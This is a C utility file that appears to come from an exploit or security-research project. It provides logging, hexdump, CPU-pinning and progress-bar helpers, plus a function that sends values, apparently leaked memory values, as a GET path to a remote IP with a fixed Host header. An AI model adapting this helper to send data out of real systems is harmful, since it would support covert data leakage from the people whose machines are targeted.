#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <sched.h>
#include <pthread.h>
#include <sys/mman.h>
#include <unistd.h>

#include <sys/socket.h>
#include <arpa/inet.h>

#include "utils.h"

void note(const char *fmt, ...) {
	printf("\033[0;33m[+] ");
	va_list args;
	va_start(args, fmt);
	vprintf(fmt, args);
	va_end(args);
	printf("\033[0m");
	printf("\n");
}

void warn(const char *fmt, ...) {
	printf("\033[0;31m[!] ");
	va_list args;
	va_start(args, fmt);
	vprintf(fmt, args);
	va_end(args);
	printf("\033[0m");
	printf("\n");
	
}

void info(const char *fmt, ...) {
	printf("\033[47;30m[i] ");
	va_list args;
	va_start(args, fmt);
	vprintf(fmt, args);
	va_end(args);
	printf("\033[0m");
	printf("\n");
	
}


void write_line(const char *fmt, ...) {
	printf("\033[0;32m[?] ");
	va_list args;
    	va_start(args, fmt);
    	vprintf(fmt, args);
    	va_end(args);
	printf("\033[0m");
	for(int i = 0; i < 100; i++)
		printf("\b");
}

void die(const char *fmt) {
	perror(fmt);
	exit(1);
}


void hexdump(const void* data, size_t size) {
	char ascii[17];
	size_t i, j;
	ascii[16] = '\0';
	for (i = 0; i < size; ++i) {
		printf("%02X ", ((unsigned char*)data)[i]);
		if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
			ascii[i % 16] = ((unsigned char*)data)[i];
		} else {
			ascii[i % 16] = '.';
		}
		if ((i+1) % 8 == 0 || i+1 == size) {
			printf(" ");
			if ((i+1) % 16 == 0) {
				printf("|  %s \n", ascii);
			} else if (i+1 == size) {
				ascii[(i+1) % 16] = '\0';
				if ((i+1) % 16 <= 8) {
					printf(" ");
				}
				for (j = (i+1) % 16; j < 16; ++j) {
					printf("   ");
				}
				printf("|  %s \n", ascii);
			}
		}
	}
}

void pin_cpu(int num) {
	cpu_set_t  mask;
	CPU_ZERO(&mask);
	CPU_SET(num, &mask);
	if ( sched_setaffinity(0, sizeof(mask), &mask)) die("pinning cpu");
}

void print_progress_bar(size_t progress, size_t total) {
	fflush(stdout);
	char *circle = "oqpbd";
	char *wheel = "-\\|/";

	char *current = wheel;

	size_t len = strlen(current);
	printf("[%c]" " %s %lf", *(current + progress % len), "%", (double)progress / (total - 1));
	for(size_t i = 0; i < 50; i++)
		printf("\b");

}


#define SA struct sockaddr

void create_http_request(char *ip, unsigned int port, void *data, size_t type) {
	
	int sockfd, connfd;
	struct sockaddr_in servaddr, cli;



	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (sockfd < 0) die("socket failed");
	bzero(&servaddr, sizeof(servaddr));

	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = inet_addr(ip);
	servaddr.sin_port = htons(port);
	if (connect(sockfd, (SA*)&servaddr, sizeof(servaddr)) != 0) die("connection failed");
	
	char request[500];

	if (type == 0) {
		char request_format[] = "GET /%s HTTP/1.0\r\nHost: www.kaanaryoverflow.com\r\nConnection: close\r\n\r\n";
		snprintf(request, 500, request_format, data);
	} else if (type == 1) {
		char request_format[] = "GET /%lx HTTP/1.0\r\nHost: www.kaanaryoverflow.com\r\nConnection: close\r\n\r\n";
		snprintf(request, 500, request_format, (unsigned long)data);
	} else if (type == 2) {
		char request_format[] = "GET /%ld HTTP/1.0\r\nHost: www.kaanaryoverflow.com\r\nConnection: close\r\n\r\n";
		snprintf(request, 500, request_format, (unsigned long)data);
	}


	write(sockfd, request, strlen(request));
	char x;
	read(sockfd, &x, 1);
	close(sockfd);
}





